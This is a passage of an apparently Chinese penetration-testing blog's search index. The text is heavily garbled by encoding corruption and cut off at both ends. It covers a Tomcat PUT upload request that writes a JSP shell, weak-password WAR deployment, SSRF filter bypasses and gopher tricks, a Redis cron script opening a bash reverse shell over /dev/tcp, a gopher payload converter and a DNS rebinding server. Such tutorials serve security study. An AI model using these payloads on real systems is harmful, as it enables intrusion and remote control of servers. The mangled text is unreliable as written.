çš„æ”»å‡»è¯·æ±‚å‘æœåŠ¡å™¨ä¸Šä¼ åŒ…å«ä»»æ„ä»£ç çš„ JSP æ–‡ä»¶ã€‚ä¹‹åï¼ŒJSP æ–‡ä»¶ä¸­çš„ä»£ç å°†èƒ½è¢«æœåŠ¡å™¨æ‰§è¡Œã€‚ æ¼æ´æœ¬è´¨ Tomcat é…ç½®äº†å¯å†™ï¼ˆreadonly=falseï¼‰ï¼Œå¯¼è‡´æˆ‘ä»¬å¯ä»¥å¾€æœåŠ¡å™¨å†™æ–‡ä»¶ï¼š \u003cservlet\u003e \u003cservlet-name\u003edefault\u003c/servlet-name\u003e \u003cservlet-class\u003eorg.apache.catalina.servlets.DefaultServlet\u003c/servlet-class\u003e \u003cinit-param\u003e \u003cparam-name\u003edebug\u003c/param-name\u003e \u003cparam-value\u003e0\u003c/param-value\u003e \u003c/init-param\u003e \u003cinit-param\u003e \u003cparam-name\u003elistings\u003c/param-name\u003e \u003cparam-value\u003efalse\u003c/param-value\u003e \u003c/init-param\u003e \u003cinit-param\u003e \u003cparam-name\u003ereadonly\u003c/param-name\u003e \u003cparam-value\u003efalse\u003c/param-value\u003e \u003c/init-param\u003e \u003cload-on-startup\u003e1\u003c/load-on-startup\u003e \u003c/servlet\u003e è™½ç„¶ Tomcat å¯¹æ–‡ä»¶åç¼€æœ‰ä¸€å®šæ£€æµ‹ï¼ˆä¸èƒ½ç›´æ¥å†™ jspï¼‰ï¼Œä½†æˆ‘ä»¬ä½¿ç”¨ä¸€äº›æ–‡ä»¶ç³»ç»Ÿçš„ç‰¹æ€§ï¼ˆå¦‚ Linux ä¸‹å¯ç”¨ / ï¼‰æ¥ç»•è¿‡äº†é™åˆ¶ã€‚ ç›´æ¥å‘é€ä»¥ä¸‹æ•°æ®åŒ…å³å¯åœ¨ Web æ ¹ç›®å½•å†™å…¥ shellï¼š PUT /1.jsp/ HTTP/1.1 Host: your-ip:8080 Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 5 shell ","date":"2021-01-12","objectID":"/2021/01/web%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/:4:1","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"WEB å®¹å™¨å®‰å…¨","uri":"/2021/01/web%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"4.2 Tomcat å¼±å£ä»¤ Tomcat æ”¯æŒåœ¨åå°éƒ¨ç½² war æ–‡ä»¶ï¼Œå¯ä»¥ç›´æ¥å°† webshell éƒ¨ç½²åˆ° web ç›®å½•ä¸‹ã€‚å…¶ä¸­ï¼Œæ¬²è®¿é—®åå°ï¼Œéœ€è¦å¯¹åº”ç”¨æˆ·æœ‰ç›¸åº”æƒé™ã€‚ 4.2.1 Tomcat æƒé™ managerï¼ˆåå°ç®¡ç†ï¼‰ manager-gui æ‹¥æœ‰ html é¡µé¢æƒé™ manager-status æ‹¥æœ‰æŸ¥çœ‹ status çš„æƒé™ manager-script æ‹¥æœ‰ text æ¥å£çš„æƒé™ï¼Œå’Œ status æƒé™ manager-jmx æ‹¥æœ‰ jmx æƒé™ï¼Œå’Œ status æƒé™ host-managerï¼ˆè™šæ‹Ÿä¸»æœºç®¡ç†ï¼‰ admin-gui æ‹¥æœ‰ html é¡µé¢æƒé™ admin-script æ‹¥æœ‰ text æ¥å£æƒé™ åœ¨ conf/tomcat-users.xml æ–‡ä»¶ä¸­é…ç½®ç”¨æˆ·çš„æƒé™ï¼š \u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e \u003ctomcat-users xmlns=\"http://tomcat.apache.org/xml\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://tomcat.apache.org/xml tomcat-users.xsd\" version=\"1.0\"\u003e \u003crole rolename=\"manager-gui\"/\u003e \u003crole rolename=\"manager-script\"/\u003e \u003crole rolename=\"manager-jmx\"/\u003e \u003crole rolename=\"manager-status\"/\u003e \u003crole rolename=\"admin-gui\"/\u003e \u003crole rolename=\"admin-script\"/\u003e \u003cuser username=\"tomcat\" password=\"tomcat\" roles=\"manager-gui,manager-script,manager-jmx,manager-status,admin-gui,admin-script\" /\u003e \u003c/tomcat-users\u003e å¯è§ï¼Œç”¨æˆ· tomcat æ‹¥æœ‰ä¸Šè¿°æ‰€æœ‰æƒé™ï¼Œå¯†ç æ˜¯ tomcatã€‚ æ­£å¸¸å®‰è£…çš„æƒ…å†µä¸‹ï¼Œtomcat8 ä¸­é»˜è®¤æ²¡æœ‰ä»»ä½•ç”¨æˆ·ï¼Œä¸” manager é¡µé¢åªå…è®¸æœ¬åœ° IP è®¿é—®ã€‚åªæœ‰ç®¡ç†å‘˜æ‰‹å·¥ä¿®æ”¹äº†è¿™äº›å±æ€§çš„æƒ…å†µä¸‹ï¼Œæ‰å¯ä»¥è¿›è¡Œæ”»å‡»ã€‚ 4.2.2 æ¼æ´å¤ç° æ‰“å¼€tomcatç®¡ç†é¡µé¢ http://your-ip:8080/manager/htmlï¼Œè¾“å…¥å¼±å¯†ç  tomcat:tomcatï¼Œå³å¯è®¿é—®åå°ï¼š ä¸Šä¼  war åŒ…å³å¯ç›´æ¥ getshellã€‚ ","date":"2021-01-12","objectID":"/2021/01/web%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/:4:2","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"WEB å®¹å™¨å®‰å…¨","uri":"/2021/01/web%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"SSRF æ¼æ´ç›¸å…³","date":"2021-01-11","objectID":"/2021/01/ssrf%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"SSRF æ¼æ´ç›¸å…³","uri":"/2021/01/ssrf%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"SSRF æ¼æ´ç›¸å…³ ","date":"2021-01-11","objectID":"/2021/01/ssrf%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:0:0","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"SSRF æ¼æ´ç›¸å…³","uri":"/2021/01/ssrf%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"1 å®šä¹‰ä¸åŸç† ","date":"2021-01-11","objectID":"/2021/01/ssrf%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:1:0","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"SSRF æ¼æ´ç›¸å…³","uri":"/2021/01/ssrf%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"1.1 å®šä¹‰ SSRF(Server-Side Request Forgery)ï¼ŒæœåŠ¡å™¨è¯·æ±‚ä¼ªé€ ï¼Œæ˜¯ä¸€ç§ç”±æ”»å‡»è€…æ„é€ è¯·æ±‚ï¼Œç”±æœåŠ¡ç«¯å‘èµ·è¯·æ±‚çš„å®‰å…¨æ¼æ´ã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œ SSRF æ”»å‡»çš„ç›®æ ‡æ˜¯ä»å¤–ç½‘æ— æ³•è®¿é—®çš„å†…éƒ¨ç³»ç»Ÿã€‚ SSRF å½¢æˆçš„åŸå› å¤§éƒ½æ˜¯ç”±äºæœåŠ¡ç«¯æä¾›äº†ä»å…¶ä»–æœåŠ¡å™¨åº”ç”¨è·å–æ•°æ®çš„åŠŸèƒ½ä¸”æ²¡æœ‰å¯¹ç›®æ ‡åœ°å€åšè¿‡æ»¤ä¸é™åˆ¶ã€‚æ¯”å¦‚ä»æŒ‡å®š URL åœ°å€è·å–ç½‘é¡µæ–‡æœ¬å†…å®¹ï¼ŒåŠ è½½æŒ‡å®šåœ°å€çš„å›¾ç‰‡ï¼Œä¸‹è½½ç­‰ç­‰ã€‚ ","date":"2021-01-11","objectID":"/2021/01/ssrf%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:1:1","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"SSRF æ¼æ´ç›¸å…³","uri":"/2021/01/ssrf%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"1.2 ç‰¹ç‚¹ æ”»å‡»è€…æ— æ³•ç›´æ¥è®¿é—®ç›®æ ‡æœºå™¨ 2 çš„æœåŠ¡ ç›®æ ‡æœºå™¨ 1 èƒ½å¤Ÿè®¿é—®ç›®æ ‡æœºå™¨ 2 çš„æœåŠ¡ ç›®æ ‡æœºå™¨ 1 æš´éœ²äº†è®¿é—®ç›®æ ‡æœºå™¨ 2 çš„æ–¹å¼ï¼Œæ”»å‡»è€…èƒ½å¤Ÿåˆ©ç”¨ ","date":"2021-01-11","objectID":"/2021/01/ssrf%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:1:2","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"SSRF æ¼æ´ç›¸å…³","uri":"/2021/01/ssrf%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"1.3 æ£€æµ‹æ–¹æ³• å› ä¸º SSRF æ¼æ´æ˜¯è®©æœåŠ¡å™¨å‘é€è¯·æ±‚çš„å®‰å…¨æ¼æ´ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡æŠ“åŒ…åˆ†æå‘é€çš„è¯·æ±‚æ˜¯å¦æ˜¯ç”±æœåŠ¡å™¨çš„å‘é€çš„ï¼Œä»è€Œæ¥åˆ¤æ–­æ˜¯å¦å­˜åœ¨ SSRF æ¼æ´ åœ¨é¡µé¢æºç ä¸­æŸ¥æ‰¾è®¿é—®çš„èµ„æºåœ°å€ ï¼Œå¦‚æœè¯¥èµ„æºåœ°å€ç±»å‹ä¸º www.baidu.com/xxx.php?image=ï¼ˆåœ°å€ï¼‰çš„å°±å¯èƒ½å­˜åœ¨ SSRF æ¼æ´ ","date":"2021-01-11","objectID":"/2021/01/ssrf%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:1:3","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"SSRF æ¼æ´ç›¸å…³","uri":"/2021/01/ssrf%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"1.4 PHP ä¸­çš„ç›¸å…³å‡½æ•° file_get_contents() fsockopen() curl_exec() ","date":"2021-01-11","objectID":"/2021/01/ssrf%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:1:4","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"SSRF æ¼æ´ç›¸å…³","uri":"/2021/01/ssrf%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"1.4 å±å®³ å¯ä»¥å¯¹å¤–ç½‘ã€æœåŠ¡å™¨æ‰€åœ¨å†…ç½‘ã€æœ¬åœ°è¿›è¡Œç«¯å£æ‰«æï¼Œè·å–ä¸€äº›æœåŠ¡çš„ banner ä¿¡æ¯ æ”»å‡»è¿è¡Œåœ¨å†…ç½‘æˆ–æœ¬åœ°çš„åº”ç”¨ç¨‹åº(æ¯”å¦‚æº¢å‡º) å¯¹å†…ç½‘ Web åº”ç”¨è¿›è¡ŒæŒ‡çº¹è¯†åˆ«ï¼Œé€šè¿‡è®¿é—®é»˜è®¤æ–‡ä»¶å®ç° æ”»å‡»å†…å¤–ç½‘çš„ Web åº”ç”¨ï¼Œä¸»è¦æ˜¯ä½¿ç”¨ get å‚æ•°å°±å¯ä»¥å®ç°çš„æ”»å‡»(æ¯”å¦‚ Struts2 æ¼æ´åˆ©ç”¨ï¼ŒSQL æ³¨å…¥ç­‰) åˆ©ç”¨ File åè®®è¯»å–æœ¬åœ°æ–‡ä»¶ ","date":"2021-01-11","objectID":"/2021/01/ssrf%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:1:5","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"SSRF æ¼æ´ç›¸å…³","uri":"/2021/01/ssrf%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"2 ç»•è¿‡æ–¹æ³• ","date":"2021-01-11","objectID":"/2021/01/ssrf%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:2:0","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"SSRF æ¼æ´ç›¸å…³","uri":"/2021/01/ssrf%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"2.1 IP ç»•è¿‡ åŠ ç«¯å£ çŸ­ç½‘å€ï¼Œä½†æ˜¯é»˜è®¤æƒ…å†µä¸‹ CURL å‘½ä»¤ä¸å¼€å¯ follow 302 è·³è½¬ æŒ‡å‘ä»»æ„ IP çš„åŸŸå xip.ioï¼Œ127.0.0.1.xip.io IP é™åˆ¶ç»•è¿‡ 127.0.0.1 0177.0.0.1 å…«è¿›åˆ¶ 0x7f.0.0.1 åå…­è¿›åˆ¶ åå…­è¿›åˆ¶å»æ‰åˆ†éš”ç¬¦ http://0x7F000001 åè¿›åˆ¶å»æ‰åˆ†éš”ç¬¦ http://2130706433 ","date":"2021-01-11","objectID":"/2021/01/ssrf%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:2:1","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"SSRF æ¼æ´ç›¸å…³","uri":"/2021/01/ssrf%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"2.2 å…¶å®ƒ Tips ç»“åˆ dict:// file:// gopher:// http://www.baidu.com@192.168.0.1 ä»¥ www.baidu.com ç”¨æˆ·åï¼Œæ£€æµ‹æ˜¯å¦æœ‰æƒé™è®¿é—® 192.168.0.1 çš„ç½‘ç«™ çŸ­è¿æ¥ï¼ˆ301 è·³è½¬ï¼Œéœ€è¦èƒ½è®¿é—®åˆ°å¤–ç½‘ï¼‰ ","date":"2021-01-11","objectID":"/2021/01/ssrf%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:2:2","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"SSRF æ¼æ´ç›¸å…³","uri":"/2021/01/ssrf%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"2.3 Gopher åè®® gopher æ˜¯ä¸€ä¸ªäº’è”ç½‘ä¸Šä½¿ç”¨çš„åˆ†å¸ƒå‹çš„æ–‡ä»¶æœé›†è·å–ç½‘ç»œåè®® gopher åè®®æ”¯æŒå‘å‡º GETã€POST è¯·æ±‚ï¼šå¯ä»¥å…ˆæˆªè· get è¯·æ±‚åŒ…å’Œ post è¯·æ±‚åŒ…ï¼Œå†æ„é€ æˆç¬¦åˆ gopher åè®®çš„è¯·æ±‚ã€‚ gopher åè®®æ˜¯ ssrf åˆ©ç”¨ä¸­ä¸€ä¸ªæœ€å¼ºå¤§çš„åè®®(ä¿—ç§°ä¸‡èƒ½åè®®)ã€‚ 2.3.1 Gopher æ§åˆ¶ Redis åå¼¹ shell å‰æ redis æœªæˆæƒ redis å¯¹ cron æœ‰å†™æƒé™ é€šè¿‡ socat æŠ“æµé‡ è„šæœ¬ï¼š echo -e \"\\n\\n*/1 * * * * bash -i \u003e\u0026 /dev/tcp/ip/port 0 \u003e\u00261\\n\\n\"|redis-cli -h $1 -p $2 -x set 1 redis-cli -h $1 -p $2 config set dir /var/spool/cron redis-cli -h $1 -p $2 config set dbfilename root redis-cli -h $1 -p $2 quit æ‰§è¡Œï¼š./shell.sh 127.0.0.1 4444 æµé‡è½¬å‘ socat -v tcp-listen:4444,fork tcp-connect:IP:6379 æµé‡è½¬æ¢ # coding: utf-8 import sys exp = '' with open(sys.argv[1]) as f: for line in f.readlines(): if line[0] in '\u003e\u003c+': continue # åˆ¤æ–­å€’æ•°ç¬¬ 2ã€3 å­—ç¬¦ä¸²æ˜¯å¦ä¸º \\r elif line[-3:-1] == r'\\r': # å¦‚æœè¯¥è¡Œåªæœ‰ \\rï¼Œå°† \\r æ›¿æ¢æˆ %0a%0d%0a if len(line) == 3: exp = exp + '%0a%0d%0a' else: line = line.replace(r'\\r', '%0d%0a') # å»æ‰æœ€åçš„æ¢è¡Œç¬¦ line = line.replace('\\n', '') exp = exp + line # åˆ¤æ–­æ˜¯å¦æ˜¯ç©ºè¡Œï¼Œç©ºè¡Œæ›¿æ¢ä¸º %0a elif line == '\\x0a': exp = exp + '%0a' else: line = line.replace('\\n', '') exp = exp + line print exp 2.3.2 Gopher å¯¹ Mysql çš„åˆ©ç”¨ å‰æï¼š å­˜åœ¨ SSRF æ¼æ´ MySQL æ— å¯†ç  Gopher åè®®è½¬åŒ– gopher://127.0.0.1:3306/_ + url ç¼–ç çš„ç™»å½•è¯·æ±‚ + åŒ…é•¿åº¦(wireshark æŠ“åŒ…æ—¶å¯ä»¥ç›´æ¥çœ‹åˆ° Packet Length) + %00%00%00%03 + æŸ¥è¯¢è¯­å¥(URL ç¼–ç ) + %01%00%00%00%01 2.3.3 ç›¸å…³å·¥å…· https://github.com/tarunkant/Gopherus ","date":"2021-01-11","objectID":"/2021/01/ssrf%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:2:3","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"SSRF æ¼æ´ç›¸å…³","uri":"/2021/01/ssrf%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"2.4 DNS é‡ç»‘å®šæ”»å‡» 2.4.1 åŸç† ä¸€èˆ¬ web åº”ç”¨ç¨‹åºé˜²å¾¡ SSRF çš„æµç¨‹å¦‚ä¸‹ï¼š è·å–åˆ°è¾“å…¥çš„ URLï¼Œä»è¯¥ URL ä¸­æå– host å¯¹è¯¥ host è¿›è¡Œ DNS è§£æï¼Œè·å–åˆ°è§£æçš„ IP æ£€æµ‹è¯¥ IP æ˜¯å¦æ˜¯åˆæ³•çš„ï¼Œæ¯”å¦‚æ˜¯å¦æ˜¯ç§æœ‰ IP ç­‰ å¦‚æœ IP æ£€æµ‹ä¸ºåˆæ³•çš„ï¼Œåˆ™è¿›å…¥ curl çš„é˜¶æ®µå‘åŒ… è§‚å¯Ÿåˆ°ï¼Œåœ¨è¿™ä¸ªæµç¨‹ä¸­ï¼Œä¸€å…±è¿›è¡Œäº†ä¸¤æ¬¡ DNS è§£æï¼šç¬¬ä¸€æ¬¡æ˜¯å¯¹ URL çš„ host è¿›è¡Œ DNS è§£æï¼Œç¬¬äºŒæ¬¡æ˜¯ä½¿ç”¨ curl å‘åŒ…çš„æ—¶å€™è¿›è¡Œè§£æã€‚è¿™ä¸¤æ¬¡ DNS è§£ææ˜¯æœ‰æ—¶é—´å·®çš„ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨è¿™ä¸ªæ—¶é—´å·®è¿›è¡Œç»•è¿‡ã€‚ æ—¶é—´å·®å¯¹åº”çš„ DNS ä¸­çš„æœºåˆ¶æ˜¯ TTLã€‚TTL è¡¨ç¤º DNS é‡Œé¢åŸŸåå’Œ IP ç»‘å®šå…³ç³»çš„ Cache åœ¨ DNS ä¸Šå­˜æ´»çš„æœ€é•¿æ—¶é—´ã€‚å³è¯·æ±‚äº†åŸŸåä¸ IP çš„å…³ç³»åï¼Œè¯·æ±‚æ–¹ä¼šç¼“å­˜è¿™ä¸ªå…³ç³»ï¼Œç¼“å­˜ä¿æŒçš„æ—¶é—´å°±æ˜¯ TTLã€‚è€Œç¼“å­˜å¤±æ•ˆåå°±ä¼šåˆ é™¤ï¼Œè¿™æ—¶å€™å¦‚æœé‡æ–°è®¿é—®åŸŸåæŒ‡å®šçš„ IP çš„è¯ä¼šé‡æ–°å»ºç«‹åŒ¹é…å…³ç³»åŠ cacheã€‚ åœ¨ä¸Šé¢çš„æµç¨‹ä¸­ï¼Œå¦‚æœåœ¨ DNS ç¬¬äºŒæ¬¡è§£æçš„æ—¶å€™ï¼Œæˆ‘ä»¬èƒ½å¤Ÿæ›´æ¢ URL å¯¹åº”çš„ IPï¼Œé‚£ä¹ˆåœ¨ TTL ä¹‹åã€ç¼“å­˜å¤±æ•ˆä¹‹åï¼Œé‡æ–°è®¿é—®æ­¤ URL çš„è¯ï¼Œå°±èƒ½è·å–è¢«æ›´æ¢åçš„ IPã€‚å¦‚æœæˆ‘ä»¬æŠŠç¬¬ä¸€æ¬¡è§£æçš„ IP è®¾ä¸ºåˆæ³• IPï¼Œå°±èƒ½ç»•è¿‡ host åˆæ³•æ€§æ£€æŸ¥ï¼›æŠŠç¬¬äºŒæ¬¡è§£æçš„ IP è®¾ä¸ºå†…ç½‘ IPï¼Œå°±è¾¾åˆ°äº† SSRF è®¿é—®å†…ç½‘çš„ç›®çš„ã€‚ æ€»ç»“ DNS é‡ç»‘å®šæ”»å‡»çš„åŸç†æ˜¯ï¼šåˆ©ç”¨æœåŠ¡å™¨ä¸¤æ¬¡è§£æåŒä¸€åŸŸåçš„çŸ­æš‚é—´éš™ï¼Œæ›´æ¢åŸŸåèƒŒåçš„ ip è¾¾åˆ°çªç ´åŒæºç­–ç•¥æˆ–è¿‡ waf è¿›è¡Œ ssrf çš„ç›®çš„ã€‚ 2.4.2 å®ç° ä¸€äº› DNS Rebinding å¹³å° https://lock.cmpxchg8b.com/rebinder.html https://requestrepo.com/ æ‰‹åŠ¨å®ç° éœ€è¦å…ˆæ·»åŠ ä¸€æ¡ NS è®°å½•å’Œä¸€æ¡ A è®°å½•ï¼š è®°å½•ç±»å‹ ä¸»æœºè®°å½• è®°å½•å€¼ NS test ns.geekby.xyz A ns 39.96.14.41 NS è®°å½•è¡¨ç¤ºåŸŸå test.geekby.xyz è¿™ä¸ªå­åŸŸåæŒ‡å®šç”± ns.geekby.xyz è¿™ä¸ªåŸŸåæœåŠ¡å™¨æ¥è§£æï¼Œç„¶å A è®°å½•è¡¨ç¤ºè¿™ä¸ª ns.geekby.xyz çš„ä½ç½®åœ¨ IP åœ°å€ 39.96.14.41 ä¸Šã€‚ è¿™é‡Œæ­å»º DNS æœåŠ¡å™¨é‡‡ç”¨ python çš„ twisted åº“ä¸­çš„ name æ¨¡å—ï¼Œä»£ç å¦‚ä¸‹ï¼š from twisted.internet import reactor, defer from twisted.names import client, dns, error, server record={} class DynamicResolver(object): def _doDynamicResponse(self, query): name = query.name.name if name not in record or record[name] \u003c 1: ip = \"127.0.0.1\" else: ip = \"1.2.3.4\" if name not in record: record[name]=0 record[name]+=1 print name+\" ===\u003e \"+ip answer = dns.RRHeader( name=name, type=dns.A, cls=dns.IN, ttl=0, payload=dns.Record_A(address=b'%s'%ip,ttl=0) ) answers = [answer] authority = [] additional = [] return answers, authority, additional def query(self, query, timeout=None): return defer.succeed(self._doDynamicResponse(query)) def main(): factory = server.DNSServerFactory( clients=[DynamicResolver(), client.Resolver(resolv='/etc/resolv.conf')] ) protocol = dns.DNSDatagramProtocol(controller=factory) reactor.listenUDP(53, protocol) reactor.run() if __name__ == '__main__': raise SystemExit(main()) 2.4.3 é˜²å¾¡æ–¹æ³• é€šè¿‡æ§åˆ¶ä¸¤æ¬¡çš„ DNS æŸ¥è¯¢è¯·æ±‚çš„é—´éš”ä½äº TTL å€¼ï¼Œç¡®ä¿ä¸¤æ¬¡æŸ¥è¯¢çš„ç»“æœä¸€è‡´ã€‚ Java åº”ç”¨çš„é»˜è®¤ TTL ä¸º 10sï¼Œè¿™ä¸ªé»˜è®¤é…ç½®ä¼šå¯¼è‡´ DNS Rebinding ç»•è¿‡å¤±è´¥ã€‚ ","date":"2021-01-11","objectID":"/2021/01/ssrf%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:2:4","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"SSRF æ¼æ´ç›¸å…³","uri":"/2021/01/ssrf%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"åŒæºç­–ç•¥ç›¸å…³","date":"2021-01-10","objectID":"/2021/01/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"åŒæºç­–ç•¥","uri":"/2021/01/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"åŒæºç­–ç•¥ ","date":"2021-01-10","objectID":"/2021/01/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/:0:0","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"åŒæºç­–ç•¥","uri":"/2021/01/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"1 å®šä¹‰ä¸åŸç† ","date":"2021-01-10","objectID":"/2021/01/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/:1:0","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"åŒæºç­–ç•¥","uri":"/2021/01/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"1.1 åŒæºå®šä¹‰ åŒæºï¼šåè®®ã€ä¸»æœºã€ç«¯å£ å¦‚æœä¸¤ä¸ª URL çš„åè®®ã€ä¸»æœºã€ç«¯å£éƒ½ç›¸åŒï¼Œåˆ™è®¤ä¸ºè¿™ä¸¤ä¸ª URL åŒæº ç¤ºä¾‹ http://example.cpm/dir/page.html http//example.com/dir2/page2.html åŒæº https://example.com/dir/page.html åè®®ä¸åŒï¼Œä¸åŒæº http://example.com:81/dir/page.html ç«¯å£ä¸åŒï¼Œä¸åŒæº https://other.com/dir/page.html ä¸»æœºä¸åŒï¼Œä¸åŒæº åŸŸåä¸å¯¹åº”çš„ IP ä¹Ÿæ˜¯ä¸åŒæº ","date":"2021-01-10","objectID":"/2021/01/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/:1:1","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"åŒæºç­–ç•¥","uri":"/2021/01/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"1.2 åŒæºç­–ç•¥ åŒæºç­–ç•¥æ˜¯æµè§ˆå™¨çš„ä¸€ä¸ªå®‰å…¨åŠŸèƒ½ï¼Œä¸åŒæºçš„å®¢æˆ·ç«¯è„šæœ¬åœ¨æ²¡æœ‰æ˜ç¡®æˆæƒçš„æƒ…å†µä¸‹ï¼Œä¸èƒ½è¯»å†™å¯¹æ–¹èµ„æºã€‚ åŒæºç­–ç•¥é™åˆ¶äº†ä»ä¸€ä¸ªæºåŠ è½½çš„æ–‡æ¡£æˆ–è„šæœ¬å¦‚ä½•ä¸æ¥è‡ªå¦ä¸€ä¸ªæºçš„èµ„æºè¿›è¡Œäº¤äº’ã€‚è¿™æ˜¯ä¸€ä¸ªç”¨äºéš”ç¦»æ½œåœ¨æ¶æ„æ–‡ä»¶çš„é‡è¦å®‰å…¨æœºåˆ¶ã€‚ ","date":"2021-01-10","objectID":"/2021/01/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/:1:2","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"åŒæºç­–ç•¥","uri":"/2021/01/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"1.3 è·¨åŸŸ ç®€å•åœ°ç†è§£å°±æ˜¯è®¿é—®éåŒæºèµ„æºï¼Œå¯ä»¥ä½¿ç”¨ HTML æ ‡ç­¾è®¿é—®ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ JS å»è®¿é—® ã€‚JS è®¿é—®éåŒæºæ—¶ï¼Œè®¿é—®è¯·æ±‚æ˜¯å¯ä»¥å‘é€çš„ï¼Œä½†æ˜¯æœåŠ¡ç«¯å°†å“åº”é€å›æ¥åæˆ‘ä»¬å®¢æˆ·ç«¯çš„æµè§ˆå™¨é»˜è®¤ä¸æ¥å—ã€‚ 1.4 åŒæºç­–ç•¥é™åˆ¶ éåŒæºæ—¶ JS ä¼šå—åˆ°å¦‚ä¸‹ä¸‰ç§è¡Œä¸ºé™åˆ¶ï¼š Cookieã€LocalStorage å’Œ 